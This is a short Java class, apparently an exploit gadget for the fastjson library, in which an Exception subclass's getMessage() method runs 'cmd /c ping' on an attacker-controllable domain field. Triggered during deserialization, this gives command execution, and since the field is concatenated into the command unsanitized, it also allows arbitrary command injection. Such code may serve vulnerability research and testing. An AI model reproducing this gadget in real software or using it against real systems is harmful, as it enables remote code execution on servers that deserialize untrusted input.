package org.heptagram.fastjson;

import java.io.IOException;

public class ViaThrowable extends Exception {
    private String domain;

    public ViaThrowable() {
        super();
    }

    public String getDomain() {
        return domain;
    }

    public void setDomain(String domain) {
        this.domain = domain;
    }

    @Override
    public String getMessage() {
        try {
            Runtime.getRuntime().exec("cmd /c ping "+domain);
        } catch (IOException e) {
            return e.getMessage();
        }
        return super.getMessage();
    }
}